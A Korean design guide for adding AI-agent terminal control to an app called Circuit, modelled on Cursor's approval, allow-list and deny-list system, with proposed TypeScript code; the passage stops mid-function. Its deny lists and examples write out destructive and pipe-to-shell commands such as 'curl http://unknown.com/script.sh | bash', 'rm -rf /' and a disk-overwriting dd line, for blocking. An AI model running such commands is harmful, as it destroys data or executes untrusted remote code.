# AI Agent Terminal Integration Guide

## 목차
1. [개요](#개요)
2. [Cursor Agent Mode 분석](#cursor-agent-mode-분석)
3. [Circuit 현재 상태](#circuit-현재-상태)
4. [비교 분석](#비교-분석)
5. [개선 제안](#개선-제안)
6. [구현 계획](#구현-계획)
7. [참고 자료](#참고-자료)

---

## 개요

이 문서는 **AI Agent가 터미널을 직접 제어**하는 시스템을 설계하기 위한 가이드입니다.

### 목표
- Cursor의 Agent Mode 터미널 처리 방식 이해
- Circuit의 현재 터미널 시스템 분석
- AI Agent ↔ Terminal 통합 방안 제시

### 핵심 질문
1. Agent가 어떻게 터미널 명령을 실행하는가?
2. 사용자 승인은 어떻게 처리하는가?
3. 위험한 명령을 어떻게 차단하는가?
4. Terminal output을 AI에게 어떻게 전달하는가?
5. 장기 실행 명령(dev server 등)은 어떻게 처리하는가?

---

## Cursor Agent Mode 분석

### 기본 동작 흐름

```
┌──────────────────────────────────────────────────────┐
│                   User Request                       │
│  "Install dependencies and run tests"                │
└────────────────┬─────────────────────────────────────┘
                 │
                 ▼
┌──────────────────────────────────────────────────────┐
│              Cursor AI Agent                         │
│  • 요청 분석                                          │
│  • 필요한 명령어 식별: ["npm install", "npm test"]   │
└────────────────┬─────────────────────────────────────┘
                 │
                 ▼
┌──────────────────────────────────────────────────────┐
│           Command Approval Check                     │
│  • YOLO Mode ON? → 자동 실행                         │
│  • YOLO Mode OFF? → 승인 요청                        │
│  • Whitelist에 있음? → 자동 실행                     │
│  • Deny list에 있음? → 차단                          │
└────────────────┬─────────────────────────────────────┘
                 │
                 ▼
┌──────────────────────────────────────────────────────┐
│           Terminal Execution                         │
│  • VS Code Terminal Profile 선택                     │
│  • Command Detection 활성화                          │
│  • 명령 실행: npm install                            │
└────────────────┬─────────────────────────────────────┘
                 │
                 ▼
┌──────────────────────────────────────────────────────┐
│           Output Capture                             │
│  stdout: "added 42 packages in 3s"                   │
│  stderr: (empty)                                     │
│  exit code: 0                                        │
└────────────────┬─────────────────────────────────────┘
                 │
                 ▼
┌──────────────────────────────────────────────────────┐
│            AI Analysis                               │
│  ✓ Dependencies installed successfully               │
│  → Next: Run tests                                   │
└────────────────┬─────────────────────────────────────┘
                 │
                 ▼
┌──────────────────────────────────────────────────────┐
│         Iterate (Repeat Cycle)                       │
│  Command: "npm test"                                 │
└──────────────────────────────────────────────────────┘
```

---

### 1. 승인 시스템 (Approval System)

#### Mode 1: Safe Mode (기본)

**특징:**
- **모든 터미널 명령에 사용자 승인 필요**
- Network 접근 명령 강조 표시
- 데이터 변경 명령 경고

**UI 예시:**
```
┌─────────────────────────────────────────────────┐
│  🤖 Agent wants to run a command                │
├─────────────────────────────────────────────────┤
│                                                 │
│  $ npm install express                          │
│                                                 │
│  This command will:                             │
│  • 📡 Download packages from network            │
│  • 📝 Modify node_modules/                      │
│  • 📄 Update package-lock.json                  │
│                                                 │
│  ☐ Always allow "npm install"                   │
│                                                 │
│  [Reject]  [Approve]                            │
└─────────────────────────────────────────────────┘
```

**장점:**
- ✅ 안전: 모든 액션을 사용자가 제어
- ✅ 학습: 어떤 명령이 실행되는지 확인 가능
- ✅ 프로덕션 적합

**단점:**
- ❌ 느림: 매번 승인 필요
- ❌ 중단: 워크플로우 끊김

---

#### Mode 2: YOLO Mode (You Only Live Once)

**활성화:**
```json
// settings.json
{
  "cursor.agent.yoloMode": true
}
```

**특징:**
- **자동 실행**: 승인 없이 즉시 실행
- **파일 삭제 포함**: 파일 삭제도 자동
- **최대 속도**: 승인 대기 시간 제거

**동작 예시:**
```
User: "Install dependencies and run tests"
  ↓ (0.5초)
Agent: npm install ✓ (자동 실행)
  ↓ (3초)
Output: added 42 packages
  ↓ (0.1초)
Agent: npm test ✓ (자동 실행)
  ↓ (2초)
Result: All tests passed
```

**장점:**
- ✅ 빠름: 승인 없이 즉시 실행
- ✅ 연속성: 워크플로우 중단 없음
- ✅ 테스트 스위트에 적합

**단점:**
- ❌ 위험: 잘못된 명령 실행 가능
- ❌ 프로덕션 부적합
- ❌ 파일 손실 위험

**권장 사용 시나리오:**
```
✅ 개발 환경 일상 작업
✅ 테스트 스위트 반복 실행
✅ 빠른 프로토타이핑
✅ 격리된 개발 컨테이너

❌ 프로덕션 환경
❌ 중요 파일 작업
❌ 외부 API 호출
❌ 데이터베이스 마이그레이션
```

---

### 2. Guardrails (안전장치)

#### Allow List (화이트리스트)

**설정:**
```json
{
  "cursor.agent.allowedCommands": [
    "npm install",
    "npm test",
    "npm run dev",
    "git status",
    "git add",
    "git commit"
  ]
}
```

**동작:**
- 리스트에 있는 명령 → **자동 승인** (YOLO 모드 아니어도)
- 사용자가 "Always allow" 체크 → 자동 추가

**장점:**
- 반복 작업 빠르게 처리
- 안전한 명령은 자동화

---

#### Deny List (블랙리스트)

**설정:**
```json
{
  "cursor.agent.deniedCommands": [
    "rm -rf /",
    "sudo rm *",
    "curl * | bash",
    "chmod 777 *",
    "> /dev/sda*"
  ]
}
```

**동작:**
- 리스트에 있는 명령 → **즉시 차단** (YOLO 모드여도)
- 정규표현식 지원

**위험 명령 예시:**
```bash
# 시스템 파괴
rm -rf /
sudo rm -rf /*

# 무분별한 다운로드 실행
curl http://unknown.com/script.sh | bash
wget -O - http://malicious.com | sh

# 권한 문제
chmod 777 /etc/passwd
chown root:root ~/*

# 디스크 직접 접근
dd if=/dev/zero of=/dev/sda
> /dev/sda1
```

---

#### Function Whitelisting (점진적 신뢰)

**첫 실행:**
```
┌─────────────────────────────────────────────────┐
│  Agent wants to run "npm install"               │
│                                                 │
│  ☐ Always allow "npm install"                   │
│                                                 │
│  [Reject]  [Approve]                            │
└─────────────────────────────────────────────────┘
```

**사용자가 "Always allow" 체크 후:**
```
User: "Install the new packages"
  ↓
Agent: npm install ✓ (자동 실행, 승인 불필요)
```

**이점:**
- 학습 단계: 처음엔 수동 승인
- 점진적 자동화: 신뢰 구축 후 자동
- 명령별 제어: 세밀한 권한 관리

---

### 3. Terminal Profile 선택

**VS Code Terminal Profile 시스템 활용:**

```typescript
// Cursor의 Terminal Profile 선택 로직
async function selectTerminalProfile() {
  const profiles = vscode.window.terminals.profiles

  // 우선순위
  for (const profile of profiles) {
    // 1. Default profile (사용자 설정)
    if (profile.isDefault) {
      return profile
    }

    // 2. Command detection 지원하는 profile
    if (profile.supportsCommandDetection) {
      return profile
    }
  }

  // 3. 시스템 기본 shell
  return {
    shell: process.env.SHELL || '/bin/bash',
    cwd: workspace.rootPath
  }
}
```

**장점:**
- ✅ 사용자 shell 설정 존중 (aliases, PATH)
- ✅ 일관된 환경 (수동 실행과 동일)
- ✅ Multi-shell 지원 (bash, zsh, fish, powershell)

**Command Detection:**
- 명령 시작/종료 감지
- Exit code 캡처
- 타이밍 측정

---

### 4. Output 캡처 및 AI 피드백

#### 실시간 Output 처리

**성공 케이스:**
```
$ npm install
  ↓ [stdout 캡처]
added 42 packages in 3s
  ↓ [AI 분석]
✓ Dependencies installed successfully
✓ No errors detected
  ↓ [다음 단계 결정]
Agent: "Dependencies ready. Now let's run tests."
```

**에러 케이스:**
```
$ npm test
  ↓ [stderr 캡처]
FAIL src/app.test.js
  ● renders correctly
    expect(received).toBe(expected)
    Expected: 200
    Received: 404
  ↓ [AI 분석]
✗ Test failed: API endpoint returning 404
✗ Expected 200 status code
  ↓ [자동 수정 시도]
Agent: "I see the issue. The API route is '/api/users' but
       the code is calling '/users'. Let me fix that."
  ↓
Agent: [Opens file, edits, saves]
  ↓
Agent: "Fixed. Running tests again..."
  ↓
$ npm test
✓ All tests passed
```

#### Output 구조

```typescript
interface CommandOutput {
  stdout: string      // 표준 출력
  stderr: string      // 에러 출력
  exitCode: number    // 종료 코드 (0 = 성공)
  duration: number    // 실행 시간 (ms)
  timestamp: number   // 시작 시간
}
```

#### AI 분석 패턴

**패턴 1: 성공 감지**
```typescript
const successPatterns = [
  /test.*passed/i,
  /build.*successful/i,
  /installed.*packages/i,
  /compiled.*successfully/i
]

function isSuccess(output: string): boolean {
  return successPatterns.some(pattern => pattern.test(output))
}
```

**패턴 2: 에러 감지 및 분류**
```typescript
interface ErrorAnalysis {
  type: 'syntax' | 'network' | 'dependency' | 'test' | 'runtime'
  message: string
  file?: string
  line?: number
  suggestion?: string
}

function analyzeError(stderr: string): ErrorAnalysis {
  // Syntax Error
  if (/SyntaxError/i.test(stderr)) {
    return {
      type: 'syntax',
      message: extractErrorMessage(stderr),
      file: extractFilePath(stderr),
      line: extractLineNumber(stderr),
      suggestion: 'Check for missing brackets or semicolons'
    }
  }

  // Network Error
  if (/ENOTFOUND|ETIMEDOUT|ECONNREFUSED/i.test(stderr)) {
    return {
      type: 'network',
      message: 'Network connection failed',
      suggestion: 'Check internet connection or proxy settings'
    }
  }

  // ... more patterns
}
```

---

### 5. 장기 실행 명령 처리

#### 문제: Dev Server 등 계속 실행되는 명령

```bash
$ npm run dev
Server listening on http://localhost:3000
webpack compiled successfully in 2.3s
# ← 계속 실행 중 (종료되지 않음)
```

**도전 과제:**
- Command detection: 명령이 "완료"된 시점을 어떻게 아는가?
- 다음 단계: Agent가 서버 시작을 기다려야 하는가?
- 리소스: Background process로 계속 실행?

#### Cursor의 해결 방법

**1. "Ready" 패턴 감지**

```typescript
const readyPatterns = [
  /server.*listening/i,
  /compiled.*successfully/i,
  /ready.*on/i,
  /started.*at/i
]

function detectServerReady(output: string): boolean {
  return readyPatterns.some(pattern => pattern.test(output))
}
```

**2. Timeout 기반 완료**

```json
{
  "cursor.agent.commandTimeout": 120000  // 2분
}
```

```typescript
async function executeCommand(cmd: string, timeout: number) {
  const process = spawn(cmd)

  return new Promise((resolve, reject) => {
    let output = ''

    // Output 수집
    process.stdout.on('data', (data) => {
      output += data.toString()

      // "Ready" 패턴 감지 시 즉시 완료
      if (detectServerReady(output)) {
        resolve({ output, ready: true })
      }
    })

    // Timeout 시 완료 (Background로 전환)
    setTimeout(() => {
      resolve({ output, ready: false, backgroundPid: process.pid })
    }, timeout)
  })
}
```

**3. Background Process 관리**

```typescript
interface BackgroundProcess {
  pid: number
  command: string
  startTime: number
  output: string[]
}

class BackgroundProcessManager {
  private processes = new Map<number, BackgroundProcess>()

  register(pid: number, command: string) {
    this.processes.set(pid, {
      pid,
      command,
      startTime: Date.now(),
      output: []
    })
  }

  getOutput(pid: number): string[] {
    return this.processes.get(pid)?.output || []
  }

  kill(pid: number) {
    process.kill(pid)
    this.processes.delete(pid)
  }
}
```

**예시 플로우:**
```
Agent: "Start dev server"
  ↓
Command: npm run dev
  ↓ (2초 후)
Output: "Server listening on port 3000"
  ↓ [Ready 패턴 감지]
Agent: ✓ Dev server started (PID: 12345, Background)
  ↓
Agent: "Server is ready. Now let's test the API."
  ↓
Command: curl http://localhost:3000/api/health
```

---

## Circuit 현재 상태

### 터미널 시스템 아키텍처

Circuit은 이미 **강력한 터미널 시스템**을 가지고 있습니다 (`TERMINAL_INTEGRATION.md` 참고).

```
┌─────────────────────────────────────────────────┐
│           Renderer Process (React)              │
├─────────────────────────────────────────────────┤
│                                                 │
│  ┌──────────────────────────────────┐          │
│  │     Terminal.tsx (Component)     │          │
│  │  • xterm.js 인스턴스 관리         │          │
│  │  • DOM 라이프사이클               │          │
│  │  • Canvas addon (transparency)   │          │
│  └────────────┬─────────────────────┘          │
│               │                                 │
│  ┌────────────▼─────────────────────┐          │
│  │   TerminalContext.tsx (State)    │          │
│  │  • Terminal instance Map          │          │
│  │  • Workspace별 격리               │          │
│  │  • IPC 통신 관리                  │          │
│  └────────────┬─────────────────────┘          │
│               │                                 │
└───────────────┼─────────────────────────────────┘
                │ IPC
┌───────────────▼─────────────────────────────────┐
│              Main Process                       │
├─────────────────────────────────────────────────┤
│                                                 │
│  ┌──────────────────────────────────┐          │
│  │  terminalManager.ts (Singleton)  │          │
│  │  • node-pty로 PTY 세션 관리       │          │
│  │  • Shell process spawning        │          │
│  │  • Output/Input 중계              │          │
│  │  • Resize 처리                    │          │
│  └──────────────────────────────────┘          │
│                                                 │
└─────────────────────────────────────────────────┘
```

### 현재 기능

| 기능 | 상태 | 설명 |
|------|------|------|
| **PTY 세션** | ✅ 구현 완료 | node-pty 기반 완전한 터미널 |
| **Workspace 격리** | ✅ 구현 완료 | 각 workspace마다 독립 터미널 |
| **세션 지속** | ✅ 구현 완료 | Workspace 전환 시에도 유지 |
| **실시간 Output** | ✅ 구현 완료 | xterm.js로 즉시 표시 |
| **Input 전달** | ✅ 구현 완료 | 사용자 입력 → PTY |
| **Resize** | ✅ 구현 완료 | 동적 크기 조정 |
| **투명 배경** | ✅ 구현 완료 | Canvas addon |
| **AI 통합** | ❌ 없음 | Agent가 터미널 제어 불가 |
| **Output 캡처** | ❌ 없음 | AI가 output 볼 수 없음 |
| **승인 시스템** | ❌ 없음 | 명령 실행 승인 없음 |
| **Guardrails** | ❌ 없음 | 위험 명령 차단 없음 |

### 강점

**1. 완전한 터미널 구현**
- Cursor보다 **더 강력**: 완전한 PTY + xterm.js
- Native shell 지원 (bash, zsh, fish)
- ANSI color, cursor positioning 완벽 지원

**2. Workspace 격리**
- Cursor는 전역 터미널
- Circuit은 **workspace별 독립 터미널**
- 더 나은 multi-workspace 지원

**3. 세션 지속성**
- Terminal 세션이 workspace 전환에도 유지
- 장기 실행 프로세스 (dev server) 문제 없음

### 부족한 점

**1. AI Agent 통합 없음**
- Agent가 터미널을 인식하지 못함
- Agent가 명령을 실행할 방법 없음
- Agent가 output을 볼 수 없음

**2. 안전장치 없음**
- 위험한 명령 차단 없음
- 사용자 승인 시스템 없음
- 명령 로깅/감사 없음

**3. Output → AI 파이프라인 없음**
- Terminal output이 Agent에게 전달 안 됨
- 에러 자동 분석 불가
- 피드백 루프 구현 불가

---

## 비교 분석

### 기능 비교표

| 기능 | Cursor Agent | Circuit (현재) | Circuit (개선 후) |
|------|--------------|----------------|-------------------|
| **터미널 구현** | VS Code Terminal | ⭐⭐⭐⭐⭐ node-pty + xterm.js | ⭐⭐⭐⭐⭐ 동일 |
| **Workspace 격리** | ⭐⭐ 전역 터미널 | ⭐⭐⭐⭐⭐ Workspace별 | ⭐⭐⭐⭐⭐ 동일 |
| **AI가 명령 실행** | ⭐⭐⭐⭐⭐ 완벽 통합 | ❌ 불가능 | ⭐⭐⭐⭐⭐ 구현 예정 |
| **승인 시스템** | ⭐⭐⭐⭐⭐ UI + YOLO | ❌ 없음 | ⭐⭐⭐⭐⭐ 구현 예정 |
| **Guardrails** | ⭐⭐⭐⭐ Allow/Deny List | ❌ 없음 | ⭐⭐⭐⭐ 구현 예정 |
| **Output 캡처** | ⭐⭐⭐⭐ stdout/stderr | ⭐⭐⭐ xterm.js만 | ⭐⭐⭐⭐⭐ AI 전달 추가 |
| **에러 분석** | ⭐⭐⭐⭐ AI 자동 분석 | ❌ 없음 | ⭐⭐⭐⭐⭐ 구현 예정 |
| **Background Process** | ⭐⭐⭐ Timeout 기반 | ⭐⭐⭐⭐⭐ PTY 지속 | ⭐⭐⭐⭐⭐ 동일 |
| **세션 지속성** | ⭐⭐ 제한적 | ⭐⭐⭐⭐⭐ 완벽 | ⭐⭐⭐⭐⭐ 동일 |

### 아키텍처 비교

**Cursor:**
```
Agent → VS Code Terminal API → Terminal Profile → Shell
                                       ↓
                                  [Command Detection]
                                       ↓
                                   AI Analysis
```

**Circuit (현재):**
```
User Input → Terminal.tsx → TerminalContext → IPC → terminalManager → PTY → Shell
                                                                         ↓
                                                                    [xterm.js 표시만]
                                                                         ↓
                                                                    (AI 연결 없음)
```

**Circuit (개선 후):**
```
AI Agent ────────────────────────┐
    │                            │
    ├→ [명령 실행 요청]          │
    │       ↓                    │
    │  [승인 시스템]             │
    │       ↓                    │
    │  terminalManager           │
    │       ↓                    │
    │    PTY → Shell             │
    │       ↓                    │
    │  [Output 캡처]             │
    │       ↓                    │
    └← [실시간 피드백] ←─────────┘
```

---

## 개선 제안

### Phase 1: Agent → Terminal 명령 실행 API

#### 목표
- Agent가 터미널 명령을 실행할 수 있는 IPC API 추가
- 위험 명령 감지 및 차단
- 사용자 승인 시스템 구현

#### 구현: terminalManager 확장

**파일: `circuit/electron/terminalManager.ts`**

```typescript
import { ipcMain, BrowserWindow } from 'electron'
import { v4 as uuidv4 } from 'uuid'

export class TerminalManager {
  private terminals = new Map<string, IPty>()
  private outputCaptures = new Map<string, CommandExecution>()
  private whitelist = new Set<string>()  // 자동 승인 명령
  private denylist = new Set<string>()   // 차단 명령

  constructor() {
    this.loadSafetyLists()
  }

  /**
   * 안전 목록 로드
   */
  private loadSafetyLists() {
    // 기본 화이트리스트
    this.whitelist = new Set([
      'ls', 'pwd', 'cat', 'grep', 'echo',
      'git status', 'git log', 'git diff',
      'npm test', 'npm run test'
    ])

    // 기본 블랙리스트 (위험 명령)
    this.denylist = new Set([
      'rm -rf /', 'sudo rm', 'mkfs', 'dd if=',
      '> /dev/sd', 'chmod 777', 'curl * | bash'
    ])
  }

  /**
   * Agent가 터미널 명령 실행 요청
   *
   * @param workspaceId - Workspace ID
   * @param command - 실행할 명령
   * @param options - 실행 옵션
   * @returns 실행 정보
   */
  async executeCommand(
    workspaceId: string,
    command: string,
    options: ExecuteCommandOptions = {}
  ): Promise<ExecuteCommandResult> {
    console.log(`[TerminalManager] Execute command request:`, {
      workspaceId,
      command,
      options
    })

    // 1. 터미널 존재 확인
    const terminal = this.terminals.get(workspaceId)
    if (!terminal) {
      throw new Error(`Terminal not found for workspace: ${workspaceId}`)
    }

    // 2. 위험 명령 체크 (Deny list)
    if (this.isDenied(command)) {
      console.warn(`[TerminalManager] Blocked dangerous command: ${command}`)
      return {
        executionId: '',
        approved: false,
        blocked: true,
        reason: 'Command is in deny list (dangerous)'
      }
    }

    // 3. 자동 승인 체크 (Whitelist)
    const autoApproved = this.isWhitelisted(command)

    // 4. 승인 필요 여부 결정
    const needsApproval =
      !autoApproved &&
      options.requireApproval !== false &&
      !options.yoloMode

    // 5. 사용자 승인 요청
    if (needsApproval) {
      const approved = await this.requestUserApproval(workspaceId, command)
      if (!approved) {
        console.log(`[TerminalManager] Command rejected by user: ${command}`)
        return {
          executionId: '',
          approved: false,
          blocked: false,
          reason: 'Rejected by user'
        }
      }
    }

    // 6. 실행 ID 생성
    const executionId = uuidv4()

    // 7. Output 캡처 시작
    this.startOutputCapture(executionId, workspaceId, command, options)

    // 8. 명령 실행
    terminal.write(command + '\r')

    console.log(`[TerminalManager] Command executed: ${executionId}`)

    return {
      executionId,
      approved: true,
      blocked: false,
      autoApproved
    }
  }

  /**
   * Deny list 체크 (위험 명령)
   */
  private isDenied(command: string): boolean {
    // 정확히 일치하는 패턴
    if (this.denylist.has(command.trim())) {
      return true
    }

    // 정규표현식 패턴
    const dangerousPatterns = [
      /rm\s+-rf\s+\//,           // rm -rf /
      /sudo\s+rm/,               // sudo rm
      /mkfs/,                    // mkfs (파일시스템 포맷)
      /dd\s+if=/,                // dd if= (디스크 복사)
      />\s*\/dev\/sd/,           // > /dev/sda (디스크 직접 쓰기)
      /chmod\s+777/,             // chmod 777 (권한 전체 오픈)
      /curl.*\|.*bash/,          // curl | bash (임의 스크립트 실행)
      /wget.*\|.*sh/,            // wget | sh
      /:(){:\|:&};:/,            // Fork bomb
    ]

    return dangerousPatterns.some(pattern => pattern.test(command))
  }

  /**
   * Whitelist 체크 (자동 승인)
   */
  private isWhitelisted(command: string): boolean {
    // 정확히 일치
    if (this.whitelist.has(command.trim())) {
      return true
    }

    // Prefix 매칭
    const whitelistPrefixes = Array.from(this.whitelist)
    return whitelistPrefixes.some(prefix =>
      command.trim().startsWith(prefix)
    )
  }

  /**
   * 사용자 승인 요청
   */
  private async requestUserApproval(
    workspaceId: string,
    command: string
  ): Promise<boolean> {
    const mainWindow = BrowserWindow.getAllWindows()[0]
    if (!mainWindow) {
      throw new Error('Main window not found')
    }

    return new Promise<boolean>((resolve) => {
      // Renderer에게 승인 Dialog 표시 요청
      mainWindow.webContents.send('terminal:request-approval', {
        workspaceId,
        command,
        timestamp: Date.now()
      })

      // 응답 대기 (최대 60초)
      const timeoutId = setTimeout(() => {
        ipcMain.removeListener('terminal:approval-response', handler)
        resolve(false)  // Timeout → 거부
      }, 60000)

      const handler = (_event: any, response: ApprovalResponse) => {
        clearTimeout(timeoutId)
        ipcMain.removeListener('terminal:approval-response', handler)

        // "Always allow" 체크된 경우 whitelist에 추가
        if (response.approved && response.alwaysAllow) {
          this.whitelist.add(command.trim())
          this.saveWhitelist()
        }

        resolve(response.approved)
      }

      ipcMain.once('terminal:approval-response', handler)
    })
  }

  /**
   * Output 캡처 시작
   */
  private startOutputCapture(
    executionId: string,
    workspaceId: string,
    command: string,
    options: ExecuteCommandOptions
  ) {
    const execution: CommandExecution = {
      id: executionId,
      workspaceId,
      command,
      startTime: Date.now(),
      output: [],
      stderr: [],
      exitCode: null,
      status: 'running'
    }

    this.outputCaptures.set(executionId, execution)

    // Timeout 설정
    const timeout = options.timeout || 30000  // 기본 30초
    const timeoutId = setTimeout(() => {
      this.completeExecution(executionId, 'timeout')
    }, timeout)

    execution.timeoutId = timeoutId

    // PTY output 리스너
    const terminal = this.terminals.get(workspaceId)
    if (!terminal) return

    const dataHandler = (data: string) => {
      execution.output.push(data)

      // Renderer (AI)에게 실시간 전송
      const mainWindow = BrowserWindow.getAllWindows()[0]
      if (mainWindow) {
        mainWindow.webContents.send('terminal:execution-output', {
          executionId,
          workspaceId,
          data,
          timestamp: Date.now()
        })
      }

      // "Ready" 패턴 감지 (dev server 등)
      if (options.detectReady && this.detectReady(data)) {
        this.completeExecution(executionId, 'ready')
      }
    }

    terminal.onData(dataHandler)
    execution.dataHandler = dataHandler
  }

  /**
   * "Ready" 패턴 감지 (장기 실행 명령)
   */
  private detectReady(output: string): boolean {
    const readyPatterns = [
      /server.*listening/i,
      /compiled.*successfully/i,
      /ready.*on/i,
      /started.*at/i,
      /listening.*port/i,
      /webpack.*compiled/i
    ]

    return readyPatterns.some(pattern => pattern.test(output))
  }

  /**
   * 실행 완료
   */
  private completeExecution(
    executionId: string,
    reason: 'timeout' | 'ready' | 'exit'
  ) {
    const execution = this.outputCaptures.get(executionId)
    if (!execution) return

    execution.status = 'completed'
    execution.completionReason = reason
    execution.endTime = Date.now()
    execution.duration = execution.endTime - execution.startTime

    // Timeout 정리
    if (execution.timeoutId) {
      clearTimeout(execution.timeoutId)
    }

    // Data handler 정리
    if (execution.dataHandler) {
      const terminal = this.terminals.get(execution.workspaceId)
      if (terminal) {
        terminal.offData(execution.dataHandler)
      }
    }

    // Renderer에 완료 통지
    const mainWindow = BrowserWindow.getAllWindows()[0]
    if (mainWindow) {
      mainWindow.webContents.send('terminal:execution-completed', {
        executionId,
        workspaceId: execution.workspaceId,
        output: execution.output.join(''),
        duration: execution.duration,
        reason
      })
    }

    console.log(`[TerminalManager] Execution completed:`, {
      executionId,
      command: execution.command,
      duration: execution.duration,
      reason
    })
  }

  /**
   * Whitelist 저장
   */
  private saveWhitelist() {
    // TODO: localStorage or file에 저장
    console.log('[TerminalManager] Whitelist saved:', Array.from(this.whitelist))
  }

  /**
   * 실행 상태 조회
   */
  getExecutionStatus(executionId: string): CommandExecution | undefined {
    return this.outputCaptures.get(executionId)
  }

  /**
   * 실행 취소
   */
  cancelExecution(executionId: string) {
    this.completeExecution(executionId, 'exit')
  }
}

// Types
interface ExecuteCommandOptions {
  requireApproval?: boolean   // 승인 필요 (기본: true)
  yoloMode?: boolean          // YOLO 모드 (자동 승인)
  timeout?: number            // Timeout (ms, 기본: 30000)
  detectReady?: boolean       // "Ready" 패턴 감지 (dev server용)
}

interface ExecuteCommandResult {
  executionId: string         // 실행 ID
  approved: boolean           // 승인 여부
  blocked: boolean            // 차단 여부
  autoApproved?: boolean      // 자동 승인 여부
  reason?: string             // 거부/차단 이유
}

interface CommandExecution {
  id: string
  workspaceId: string
  command: string
  startTime: number
  endTime?: number
  duration?: number
  output: string[]
  stderr: string[]
  exitCode: number | null
  status: 'running' | 'completed' | 'failed'
  completionReason?: 'timeout' | 'ready' | 'exit'
  timeoutId?: NodeJS.Timeout
  dataHandler?: (data: string) => void
}

interface ApprovalResponse {
  approved: boolean
  alwaysAllow?: boolean
}
```

#### IPC Handlers 등록

**파일: `circuit/electron/main.cjs`**

```javascript
// 기존 imports...
const { getTerminalManager } = require('./terminalManager')

// IPC Handlers 등록
function setupTerminalHandlers() {
  const terminalManager = getTerminalManager()

  // 명령 실행
  ipcMain.handle('terminal:execute-command', async (event, params) => {
    const { workspaceId, command, options } = params
    return await terminalManager.executeCommand(workspaceId, command, options)
  })

  // 실행 상태 조회
  ipcMain.handle('terminal:get-execution-status', (event, executionId) => {
    return terminalManager.getExecutionStatus(executionId)
  })

  // 실행 취소
  ipcMain.handle('terminal:cancel-execution', (event, executionId) => {
    terminalManager.cancelExecution(executionId)
    return { success: true }
  })

  // Whitelist에 추가
  ipcMain.handle('terminal:add-to-whitelist', (event, command) => {
    terminalManager.whitelist.add(command)
    terminalManager.saveWhitelist()
    return { success: true }
  })
}

app.whenReady().then(() => {
  // ... 기존 코드
  setupTerminalHandlers()
})
```

---

### Phase 2: 승인 Dialog UI

#### 목표
- 사용자가 명령을 승인/거부할 수 있는 UI
- 위험한 명령에 대한 경고 표시
- "Always allow" 옵션 제공

#### 구현: CommandApprovalDialog 컴포넌트

**파일: `circuit/src/components/terminal/CommandApprovalDialog.tsx`**

```typescript
import { useState, useEffect } from 'react'
import {
  AlertDialog,
  AlertDialogAction,
  AlertDialogCancel,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogFooter,
  AlertDialogHeader,
  AlertDialogTitle,
} from '@/components/ui/alert-dialog'
import { Checkbox } from '@/components/ui/checkbox'
import { AlertCircle, Terminal, Shield } from 'lucide-react'
import { cn } from '@/lib/utils'

interface CommandApprovalRequest {
  workspaceId: string
  command: string
  timestamp: number
}

export function CommandApprovalDialog() {
  const [request, setRequest] = useState<CommandApprovalRequest | null>(null)
  const [alwaysAllow, setAlwaysAllow] = useState(false)
  const ipcRenderer = window.require('electron').ipcRenderer

  // IPC 리스너 등록
  useEffect(() => {
    const handler = (_event: any, req: CommandApprovalRequest) => {
      console.log('[CommandApprovalDialog] Approval request:', req)
      setRequest(req)
      setAlwaysAllow(false)  // Reset
    }

    ipcRenderer.on('terminal:request-approval', handler)

    return () => {
      ipcRenderer.removeListener('terminal:request-approval', handler)
    }
  }, [])

  if (!request) {
    return null
  }

  const isDangerous = analyzeCommandDanger(request.command)
  const commandParts = parseCommand(request.command)

  const handleApprove = () => {
    ipcRenderer.send('terminal:approval-response', {
      approved: true,
      alwaysAllow
    })
    setRequest(null)
  }

  const handleReject = () => {
    ipcRenderer.send('terminal:approval-response', {
      approved: false,
      alwaysAllow: false
    })
    setRequest(null)
  }

  return (
    <AlertDialog open={!!request} onOpenChange={(open) => {
      if (!open) {
        handleReject()
      }
    }}>
      <AlertDialogContent className="max-w-2xl">
        <AlertDialogHeader>
          <AlertDialogTitle className="flex items-center gap-2">
            {isDangerous ? (
              <AlertCircle className="h-5 w-5 text-destructive" />
            ) : (
              <Terminal className="h-5 w-5 text-primary" />
            )}
            Agent wants to run a command
          </AlertDialogTitle>
          <AlertDialogDescription className="space-y-4">
            {/* Command Display */}
            <div className="mt-4 p-4 bg-secondary rounded-lg font-mono text-sm">
              <div className="flex items-start gap-2">
                <span className="text-muted-foreground select-none">$</span>
                <span className="flex-1">{request.command}</span>
              </div>
            </div>

            {/* Danger Warning */}
            {isDangerous && (
              <div className="p-3 bg-destructive/10 border border-destructive/20 rounded-lg">
                <div className="flex items-start gap-2">
                  <AlertCircle className="h-4 w-4 text-destructive mt-0.5 flex-shrink-0" />
                  <div className="space-y-1">
                    <div className="font-medium text-destructive text-sm">
                      ⚠️ This command may be dangerous
                    </div>
                    <div className="text-xs text-destructive/80">
                      This command can modify important files or system settings.
                      Please review carefully before approving.
                    </div>
                  </div>
                </div>
              </div>
            )}

            {/* Command Info */}
            <div className="space-y-2">
              <div className="text-sm font-medium">This command will:</div>
              <div className="space-y-1 text-sm text-muted-foreground">
                {commandParts.effects.map((effect, i) => (
                  <div key={i} className="flex items-start gap-2">
                    <span className="text-primary">•</span>
                    <span>{effect}</span>
                  </div>
                ))}
              </div>
            </div>

            {/* Always Allow Option */}
            {!isDangerous && (
              <div className="flex items-start gap-3 p-3 bg-muted rounded-lg">
                <Checkbox
                  id="always-allow"
                  checked={alwaysAllow}
                  onCheckedChange={(checked) => setAlwaysAllow(!!checked)}
                  className="mt-0.5"
                />
                <label
                  htmlFor="always-allow"
                  className="text-sm cursor-pointer flex-1"
                >
                  <div className="font-medium">
                    Always allow "{commandParts.program}"
                  </div>
                  <div className="text-xs text-muted-foreground mt-1">
                    This command will be automatically approved in the future
                  </div>
                </label>
              </div>
            )}

            {/* Security Note */}
            <div className="flex items-start gap-2 text-xs text-muted-foreground">
              <Shield className="h-3 w-3 mt-0.5 flex-shrink-0" />
              <span>
                Circuit uses guardrails to protect against dangerous commands.
                You can configure this in settings.
              </span>
            </div>
          </AlertDialogDescription>
        </AlertDialogHeader>
        <AlertDialogFooter>
          <AlertDialogCancel onClick={handleReject}>
            Reject
          </AlertDialogCancel>
          <AlertDialogAction
            onClick={handleApprove}
            className={cn(
              isDangerous && "bg-destructive hover:bg-destructive/90"
            )}
          >
            {isDangerous ? 'Approve Anyway' : 'Approve'}
          </AlertDialogAction>
        </AlertDialogFooter>
      </AlertDialogContent>
    </AlertDialog>
  )
}

/**
 * 명령어 위험도 분석
 */
function analyzeCommandDanger(command: string): boolean {
  const dangerousPatterns = [
    /rm\s+-rf/,
    /sudo/,
    /chmod\s+777/,
    /curl.*\|.*bash/,
    /wget.*\|.*sh/,
    /mkfs/,
